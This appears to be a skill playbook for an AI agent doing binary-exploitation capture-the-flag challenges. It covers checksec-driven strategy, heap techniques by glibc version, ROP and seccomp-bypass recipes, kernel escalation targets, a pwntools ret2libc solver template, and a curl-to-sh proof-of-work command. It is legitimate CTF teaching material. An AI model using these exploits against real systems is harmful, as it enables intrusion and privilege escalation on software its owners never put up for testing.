# Skill Module: pwn (binary exploitation)

Shared, read-only playbook for one userland (or kernel) binary-exploitation target. **base.md owns the loop, submission/POISON, belief≠proof, local-build/PoW-general, per-file/function decomposition, boundaries, the notes model, and "never fabricate — measure it."** This file is pwn-specific decision tables, recipes, and tools only. The exploit lives in `solver.py`; remote `host:port` + flag path are in `../chal_desc.md`; findings go in `notes/{ANALYSIS,VULN,NEXT}.md`; cores/logs/scratch in `tmp/`.

## Toolbox (install on demand; don't preinstall everything)
```
pip install pwntools ropper ROPgadget      # ELF/ROP/cyclic/shellcraft/remote; gadget search
gem install one_gadget seccomp-tools        # execve one-shots; syscall-filter dump
```
- **Core:** `pwntools`, `gdb`+`pwndbg`/`gef`, `one_gadget ./libc.so.6`, `ROPgadget`/`ropper` (`ropr` is faster on huge bins), `seccomp-tools dump`, `checksec`, `patchelf`, `objdump -d -Mintel`, `strace`/`ltrace`.
- **libc matching:** `pwninit` + `glibc-all-in-one`; ID a leaked libc at libc.rip / libc.blukat.me / libc-database `./find`; no version → pwntools `DynELF(leak, elf=elf)` resolves symbols from a leak alone.
- **Find the crash:** compile source with `-fsanitize=address,undefined` to pinpoint the overflow; or fuzz (AFL++ / libFuzzer) to a crashing input, then reason from it.
- **Kernel:** `extract-vmlinux`/`vmlinux-to-elf`, `qemu -s -S` + gef, `cpio`. (`one_gadget` n/a in kernel.)

## Recon: let checksec pick the strategy
```
file ./chall
checksec --file=./chall                     # or: pwn checksec ./chall
strings -n 6 ./chall | grep -iE 'flag|/bin/sh|system|cat|token|%[dspx]'
seccomp-tools dump ./chall                   # execve blocked? → ORW / seccomp-bypass table below
```
Mitigation → what it forces on you:

| checksec says | Consequence |
|---|---|
| **No canary** | straight stack BOF to saved RIP; no leak needed for control |
| **Canary** | leak it first (fmt/OOB read/partial), or overwrite a non-canary target; a wrong canary = deterministic crash, not flakiness |
| **NX enabled** (default) | no stack shellcode → ROP / ret2libc |
| **NX disabled** | shellcode-on-stack viable if you can jump to it |
| **PIE** | every code address needs a leak; base = leak − known_offset |
| **No PIE** | `.text`/PLT/GOT fixed — read them straight from the ELF |
| **RELRO: Partial** | GOT writable → GOT overwrite; also ret2dlresolve viable |
| **RELRO: Full** | GOT read-only → pivot to `_IO_FILE`/FSOP / return address |
| **Static** | no libc; hunt syscall gadgets → SROP / ret2syscall / ORW |

Disassemble the *target function*, not the whole binary:
```
objdump -d -Mintel ./chall | less
ghidra_headless . tmpproj -import ./chall -postScript DecompileFn.java main -deleteProject
```

## Pinpoint the bug before you theorize (concrete oracle commands)
Base owns the "sanitizer/fuzz as ground-truth oracle" framing — here are the pwn commands. Source available:
```
gcc -g -fsanitize=address,undefined -fno-omit-frame-pointer chall.c -o chall.asan
./chall.asan < crash.bin                 # report names file:line + overflow direction/size
clang -g -fsanitize=address,fuzzer harness.c -o fuzz && ./fuzz -max_len=512 corpus/
afl-cc chall.c -o chall.afl && afl-fuzz -i seeds -o out -- ./chall.afl @@   # binary-only: afl-qemu (-Q)
```
The crash *site* is usually not the bug — walk the call stack back to the writer, in gdb:
```
gdb -q ./chall -ex run                    # feed the crashing input on stdin
bt                                        # find the frame that CORRUPTS, not the ret that faults
frame N; info locals; p &buf; p/d $rsp-(long)&buf   # measure the real overflow distance
```

## Vuln class from the input sink
Find where attacker input lands, then match it. The bug is the one call that deviates from the safe idiom.

| Sink you see | Class | Primitive it yields |
|---|---|---|
| `gets`, `read(0,buf,BIG)`, `scanf("%s")`, oversized `fread`/`memcpy` (len before check) | **Stack BOF** | overwrite saved RIP / local ptr / canary |
| `printf(user)` (no format arg) | **Format string** | `%p/%s` arbitrary read, `%n` arbitrary write; leak stack/libc/canary |
| freed chunk reused / freed twice | **UAF / double-free / tcache poison** | corrupt `fd` → malloc at arbitrary address |
| copy of len N into size-N buf writing `[N]` | **Off-by-one / null-byte** | smash `size`/`prev_size` low byte → chunk overlap |
| signed/unsigned or truncated size check | **Integer** | check passes, copy overflows; or negative index → OOB |
| index not bounds-checked | **Type confusion / OOB array** | relative or bounded arbitrary R/W |

## Primitive ladder (prove each rung by running it before the next)
1. **Offset control** — own RIP or a target pointer. Derive with a cyclic pattern, never guess:
```python
from pwn import *
context.binary = elf = ELF('./chall')
p = process('./chall'); p.sendline(cyclic(400)); p.wait()
off = cyclic_find(p.corefile.read(p.corefile.rsp, 8), n=8)   # n=8 for 64-bit; hardcode result
```
2. **Leak** — defeat ASLR/PIE/canary (one good leak usually unlocks the rest).
3. **AAR / AAW** — read-what-where / write-what-where.
4. **Control flow** — return addr, GOT (Partial RELRO), `__free_hook`/`__malloc_hook` (glibc ≤2.33), stack pivot, or FSOP.
5. **Shell / flag** — `system("/bin/sh")`, SROP `execve`, one_gadget, or ORW chain.

## libc: identify the exact build, then anchor every symbol
A leaked libc pointer is worthless until you know the exact build — every offset depends on it.
```
pwninit --bin ./chall --libc ./libc.so.6   # patchelf's interp/rpath to the given libc+ld, drops a template
./find printf 560 system 390               # libc-database: match low-3-nibbles of ≥2 leaked syms (or paste at libc.rip)
./download 2.31-0ubuntu9.9_amd64           # glibc-all-in-one: fetch that exact build + its ld to run/debug locally
```
Anchor everything to the identified file — never to "typical" offsets from memory:
```python
libc = ELF('./libc.so.6')
libc.address = leak - libc.sym['puts']     # leaked symbol's runtime addr
system = libc.sym['system']; binsh = next(libc.search(b'/bin/sh\x00'))
```
**No libc at all, but a repeatable leak primitive** (fmt/AAR reading N bytes at an address): resolve symbols live with `DynELF` — no version needed:
```python
d = DynELF(lambda a: leak_bytes(a), elf=elf)   # leak_bytes(addr) -> raw bytes at addr
system = d.lookup('system', 'libc')
```
`one_gadget ./libc.so.6` gives single-jump `execve("/bin/sh")` gadgets — each has a register/stack constraint (e.g. `[rsp+0x40]==NULL`). Verify it holds at call time; else fall back to ret2libc.

## Heap technique by glibc version — record the version in `notes/ANALYSIS.md` first
Get the version (`strings libc.so.6 | grep 'GNU C Library'` or the Ubuntu tag); it changes everything.

| glibc | What changes | Move |
|---|---|---|
| **2.26+** | tcache: 7 chunks/bin, `fd`-linked, near-zero checks | double-free/UAF → overwrite `fd` → malloc your target. Easiest arbitrary alloc |
| **2.29+** | tcache `key` field detects trivial double-free | clear/edit `key`, or cycle through fastbin to dup |
| **2.32+** | **safe-linking**: `fd = ptr ^ (chunk_addr >> 12)` | write `masked = target ^ (pos >> 12)`, never a raw ptr. The **first** freed chunk in a bin has `fd = 0 ^ (chunk>>12)` → leaking that fd is a free **heap leak**: `heap_base = fd << 12`. tcache double-free still legal |
| **2.34+** | `__free_hook`/`__malloc_hook` **removed** | pivot to FSOP — **House of Apple 2** (below), or `setcontext`, or `__run_exit_handlers`/`__call_tls_dtors` (defeat `pointer_guard`) |

Version-independent staples: **unsorted bin** — a freed chunk's `fd`/`bk` points into `main_arena`, so a UAF read there is a reliable **libc leak** (unsorted-bin *attack* writes `main_arena+88` pre-2.29); **fastbin dup** — the size-field check lets you alloc near a fake size field. Named houses when tcache is poisoned/constrained: **Einherjar** (null-byte off-by-one → `prev_size`/`PREV_INUSE` → backward consolidation/overlap), **Orange** (top-chunk resize + unsorted → old-style `_IO_list_all` FSOP), **Force** (unbounded top-chunk size → alloc anywhere; pre-2.29).

### House of Apple 2 (glibc ≥2.34, hooks gone) — RCE from one arbitrary write to a stdio pointer
When hooks and hook-based one_gadgets are gone and you can control `_IO_list_all` (or any FILE the flush walks):
1. Forge a fake `_IO_FILE`; set `_IO_list_all` → it.
2. `vtable = _IO_wfile_jumps` (a *real* libc vtable → passes the post-2.28 vtable-range check).
3. Point `fp->_wide_data` at a fake wide struct whose `_wide_vtable->__doallocate` slot = `system`. The overflow path calls `fp->_wide_data->_wide_vtable->__doallocate(fp)` with **`rdi = fp`**.
4. Set flags/`_IO_write_base`/`_IO_buf_base` so the write path reaches `_IO_wdoallocbuf`: keep `_IO_NO_WRITES` clear in `_flags`, and set `_wide_data->_IO_write_base = 0`, `_wide_data->_IO_buf_base = 0`.
5. `rdi = fp`, so the command lives at the FILE's start (`/bin/sh`); many exploits place the string via an offset/alternate command since `_flags`+0 must still pass flag checks.
6. Trigger: `exit`/`__run_exit_handlers` → `_IO_flush_all_lockp`, or any `fclose`/`fwrite`/`puts` that walks `_IO_list_all`.

**setcontext (RDI/full-register control, hooks-gone):** point the `__doallocate` slot at `setcontext+61` instead of `system` — it loads *every* register from the struct at `rdx` (`rdx=fp->_wide_data`: `RSP←[rdx+0xa0]`, `RIP←[rdx+0xa8]`, `RDI←[rdx+0x68]`), pivoting straight into a ROP chain. **SUID-root target:** `system("/bin/sh")` fails (dash drops privs when `uid!=euid`) → setcontext-pivot to `setuid(0)` then `system("/bin/sh")`.

## Stack-return gotchas & no-leak returns
| Symptom / constraint | Fix |
|---|---|
| SIGSEGV at a `movaps` inside `system`/libc | stack not 16-byte aligned → prepend one extra bare `ret` gadget before the call |
| Need a clean frame to loop / re-enter | return to the **`call vuln`** (or `call main`) instruction, not the prologue — keeps `rsp` aligned, re-enters cleanly |
| `read(0,buf,N)` return value lands in `rax` | send **exactly** N bytes so `rax=N`; a short read changes `rax` (matters when `rax` is the SROP/syscall number — e.g. `stub_execveat`=0x142) |
| Overflow too small for a full chain | **stack pivot** to a controlled buffer: `leave;ret` (set `rbp=fake-8`), `add rsp,N; ret`, or `xchg eax,esp; ret` (needs `pop rax`). Double `leave;ret` walks rsp to BSS |
| Partial RELRO and **no leak at all** | **ret2dlresolve**: forge `Elf64_Rela`+`Elf64_Sym`+string, call `PLT[0]` with your reloc index → resolver runs `system` for you |
| No `pop rsi`/`pop rdx` gadget | **ret2csu** (`__libc_csu_init`): set `rbx/rbp/r12-r15`, gadget loads `rsi=r14, rdx=r13`, calls `[r12+rbx*8]` |
| **Forking server** (canary/PIE constant across forks) | brute the canary **byte-by-byte**: correct byte = no crash; ≤256×8 tries, no leak needed. Same trick recovers saved-RIP low bytes |

```python
# ret2dlresolve (no libc, no leak, Partial RELRO):
rop = ROP(elf)
dl  = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dl.data_addr)                 # stage the forged Rela/Sym/str into a writable page
rop.ret2dlresolve(dl)
io.sendline(flat({OFFSET: rop.chain()})); io.sendline(dl.payload)
```

## ROP quick refs
- **ret2libc** — `pop rdi; ret` → `&"/bin/sh"` → `ret` (align) → `system`. The bare `ret` fixes 16-byte alignment / `movaps` crashes.
- **ret2csu** — 3-arg calls (e.g. `execve`) when `pop rsi/rdx` gadgets are scarce; see table above.
- **SROP** — have `syscall; ret` and control of `rax`? Push a `SigreturnFrame()` to set *all* registers at once → `execve("/bin/sh",0,0)`. Ideal for tiny/static binaries.
- **ORW** (execve blocked) — chain `open`/`openat` → `read` → `write` on the exact flag path from `../chal_desc.md`.
- Gadgets: `ROPgadget --binary ./chall | grep 'pop rdi'`, `ropper`, or pwntools `ROP(elf)`:
```python
rop = ROP(elf)
rop.raw(rop.find_gadget(['ret']))         # alignment
rop.system(binsh)
payload = flat({OFFSET: rop.chain()})
```

## seccomp: bypass the syscall filter (`seccomp-tools dump` shows the policy)
| Filter blocks | Bypass |
|---|---|
| `execve` (59) only | `execveat` (322), or just ORW (`openat`+`read`+`write`) |
| exact `nr==59`, native ABI only | **x32 ABI**: `rax = 0x40000000 \| 59` — an exact-59 (64-bit) match misses the x32 invocation, which still execs |
| `open`/`openat` | `openat2` (**437**), or read the file via `readv`/`preadv2` |
| `write` | `sendfile`, `writev`, `pwrite64` |
| arch not pinned to x86-64 | switch ABI (i386/x32) via a `retfq` to a 32-bit CS if the filter only guards `AUDIT_ARCH_X86_64` |

## Turn a compare into an oracle (kill the blind brute; ask the debugger specific questions)
When a local check gates progress (password/license/flag `memcmp`) or you need a deterministic run:
```
# LD_PRELOAD shim: make memcmp/strcmp return the match-count → recover the secret byte-by-byte
gcc -shared -fPIC preload.c -o preload.so && LD_PRELOAD=./preload.so ./chall
# freeze nondeterminism so a run is reproducible: time()->0, srand/rand fixed, getpid fixed (same shim)
# gdb: read the expected value directly instead of guessing — one SPECIFIC question at a time
gdb -q ./chall -ex 'b *cmp_site' -ex run -ex 'x/s $rsi' -ex 'p/d (int)$rax' -ex 'p $rdi'
```

## Kernel pwn primer (challenge ships `bzImage` + `rootfs.cpio` + `run.sh`)
```
extract-vmlinux ./bzImage > vmlinux        # or vmlinux-to-elf ./bzImage vmlinux  (keeps symbols)
zcat rootfs.cpio | cpio -idv               # edit init → root shell for local dev, then repack
# run.sh usually has -s (gdbstub :1234); add -S to pause at boot
gdb-multiarch vmlinux -ex 'target remote :1234'    # gef: kbase / ksymaddr
```
Escalation targets (first two need no ASLR leak):

| Target | Win |
|---|---|
| `modprobe_path` | overwrite → `/tmp/x`; trigger by exec'ing a file with a bad magic → kernel runs your script as root |
| `core_pattern` | overwrite → `\|/tmp/x`; segfault any process → kernel pipes the core to your handler as root |
| `commit_creds(prepare_kernel_cred(0))` | call in kernel context (ROP) → current task gets root, then drop to userland shell |

Heap spray — **match the vulnerable object's `kmalloc` cache size** to the spray struct:

| Struct (cache) | Handle via | Gives |
|---|---|---|
| `seq_operations` (kmalloc-32) | `open("/proc/self/stat")` | fn-ptr set → leak / control on `read` |
| `tty_struct` (kmalloc-1024) | `open("/dev/ptmx")` | fake `ops` vtable → kROP / stack pivot |
| `msg_msg` (kmalloc-64..4096, elastic) | `msgsnd`/`msgrcv` | OOB → arbitrary read, spray |
| `user_key_payload` (variable) | `add_key` | leak / spray arbitrary bytes |
| `pipe_buffer` (kmalloc-1024) | `pipe()` | UAF page → `->ops` control (Dirty Pipe-ish) |
| `setxattr` buf (kmalloc-32..1024, transient) | `setxattr()` | momentary controlled-value write (file must exist on remote) |

- **KASLR leak** then everything else; **KPTI**: return to userland via the `swapgs`/`iretq` trampoline, not a raw ret; **SMEP/SMAP**: no ret2usr — ROP fully in kernel text.
- **Cross-cache** (SLUB per-CPU free → empty slab back to buddy allocator) escapes even a dedicated `kmem_cache_create()` cache.
- **addr_limit bypass:** a module that sets `KERNEL_DS` but skips restore on an error path → force the error, then userspace `read`/`write` reaches kernel memory.
- Widen a race window: **`userfaultfd`**/**FUSE** (your handler stalls a `copy_from_user`) or **`MADV_DONTNEED`** to force a re-fault — classic for double-fetch / TOCTOU / UAF races.

## Apple-Silicon (arm64 host)
`uname -m` = arm64 → do NOT run x86-64 challenge binaries natively. Debug under emulation: `qemu-x86_64-static -g 1234 ./chall` + `gdb-multiarch -ex 'target remote :1234'` (or `qdb`). Static RE (Ghidra/angr) is arch-agnostic; hit the remote for real dynamic behavior.

## pwntools solver skeleton — land it locally, flip one flag for remote
```python
#!/usr/bin/env python3
from pwn import *
import os, sys, hashlib, itertools

context.binary = elf = ELF('./chall')
context.log_level = 'info'                 # 'debug' to see wire bytes
libc = ELF('./libc.so.6') if os.path.exists('./libc.so.6') else elf.libc
HOST, PORT = 'REMOTE_HOST', 0              # from ../chal_desc.md
OFFSET = 0                                 # measure with cyclic; never guess

def solve_bits(prefix, nbits, alg='sha256'):     # sha256(prefix+S) has >=nbits leading zero bits
    for i in itertools.count():
        s = str(i).encode()
        if int.from_bytes(hashlib.new(alg, prefix + s).digest(), 'big') >> (256 - nbits) == 0:
            return s

def handle_pow(io):                          # adapt parse to the EXACT line the server prints
    # line = io.recvline_contains(b'sha256').decode(); prefix=...; nbits=...
    # io.sendline(solve_bits(prefix.encode(), nbits))
    return io

def start():
    if args.REMOTE: return handle_pow(remote(HOST, PORT))
    if args.GDB:    return gdb.debug(elf.path, gdbscript='b *main\nc')
    return process(elf.path)

io = start()

# === leak stage ===
io.recvuntil(b'> ')
io.sendline(payload_leak)
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']
log.success('libc base = %#x', libc.address)
assert libc.address & 0xfff == 0, 'leak misaligned — parse is wrong'

# === exploit stage ===
rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']))          # alignment
rop.system(next(libc.search(b'/bin/sh\x00')))
io.sendline(flat({OFFSET: rop.chain()}))
io.interactive()                           # cat the flag from the REMOTE socket
```
`python3 solver.py` local, `... REMOTE` target, `... GDB` debug. (Local build → fake flag; the real flag is on the remote — base §1/§5.)

## Remote / PoW / submission
- Each `bash` call is a **fresh process** — for any stateful service write a `pwntools`/socket script, don't chain `nc` calls. For raw binaries over `nc`: `stty raw -echo`.
- **PoW:** the `solve_bits` above handles sha256 leading-zero-*bits* gates; a hex-*nibble* variant checks `hexdigest().startswith('0'*n)`. redpwn/kctf gates print a token → run `curl -sSfL https://pwn.red/pow | sh -s <challenge>` or `pip install pow` then `pow <arg>`. Solve the PoW before anything else on connect.
- **Missing address:** if you need the remote (real flag / remote-only) but `../chal_desc.md` has none and it isn't marked "none", run `request-remote "<what you need>"`, then re-read the brief (also re-read right before connecting — the operator may add it mid-run).
- Submission is human-verified: you print the flag, the operator submits (`submit-flag "CTF{...}"`). No auto-submit.

## Determinism under ASLR / flaky remote
- Prefer a **full leak** over a partial-overwrite brute — determinism beats a 1/16 guess.
- Before blaming ASLR, fix stack alignment: a `movaps` fault in `system` is deterministic and masquerades as flakiness.
- Local debugging with ASLR off: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` (if permitted) — but re-verify with ASLR **on** before trusting the chain remotely.
- When a real brute is unavoidable, loop it and detect the hit:
```python
for _ in range(300):
    io = start()
    try:
        # ... run chain ...
        line = io.recvline_contains(b'flag', timeout=2)
        if b'{' in line: log.success('HIT %s', line); break
    except EOFError:
        pass
    finally:
        io.close()
```

## Getting the flag out
- Shell → `cat <flagfile>` / `ls -la`; the filename is usually in `../chal_desc.md`.
- No shell (ORW/seccomp) → your chain must `open`+`read`+`write` that exact path to stdout.
- The real flag prints on the **remote** socket — confirm you ran with `REMOTE` before submitting. Record the winning offset / libc-base / gadget chain in `notes/VULN.md` (the proven primitive) so a retry resumes from the last proven rung; log dead ends and POISON in `notes/NEXT.md`.
- Cross-category pivot (RE to understand the binary, crypto to break a check, web/misc for the delivery surface) → open `../../skills/<cat>.md`.
